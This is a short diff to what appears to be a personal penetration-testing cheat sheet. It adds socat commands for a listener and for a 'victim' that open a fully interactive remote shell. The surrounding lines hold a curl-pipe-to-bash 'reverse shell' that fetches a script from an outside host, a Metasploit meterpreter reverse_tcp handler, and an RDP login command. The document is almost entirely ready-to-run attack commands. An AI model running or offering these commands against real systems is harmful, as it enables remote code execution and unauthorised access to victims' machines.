@@ -22,6 +22,16 @@ TOP DOG reverse shell `curl http://192.168.45.152:8000/shell.sh | bash`
 
 `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`
 
+### Fully Interactive TTY Upgrade
+
+```
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
 ## RDP
 `sudo xfreerdp /u:"jason" /drive:/root /v:192.168.247.203`
 
